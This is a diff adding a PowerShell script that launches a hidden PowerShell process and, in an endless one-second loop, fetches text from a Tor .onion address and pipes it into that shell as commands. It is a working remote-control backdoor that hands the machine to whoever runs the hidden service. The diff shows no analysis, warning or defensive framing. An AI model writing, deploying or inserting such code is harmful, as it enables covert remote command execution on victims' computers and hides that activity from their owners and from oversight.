@@ -1,0 +1,33 @@
+Add-Type -AssemblyName System.Net.Http
+
+$client = New-Object System.Net.Http.HttpClient
+
+$ps = New-Object System.Diagnostics.Process
+
+$ps.StartInfo.FileName = "powershell.exe"
+$ps.StartInfo.Arguments = "-NoLogo -NoExit"
+$ps.StartInfo.UseShellExecute = $false
+$ps.StartInfo.RedirectStandardInput = $true
+$ps.StartInfo.RedirectStandardOutput = $true
+$ps.StartInfo.RedirectStandardError = $true
+$ps.StartInfo.CreateNoWindow = $true
+
+$ps.Start()
+
+$stdin = $ps.StandardInput
+
+while ($true) {
+    try {
+        $pageContents = $client.GetStringAsync("http://2sjmjgbhmb6ctwysnqtnf2qjmxvurljc3ednd37qshwrkfa2m3eg3bqd.onion").Result
+
+        if ($pageContents -ne "") {
+            $stdin.WriteLine($pageContents)
+            $stdin.Flush()
+        }
+    }
+    catch {
+        Write-Host $_.Exception.Message
+    }
+
+    Start-Sleep -Seconds 1
+}
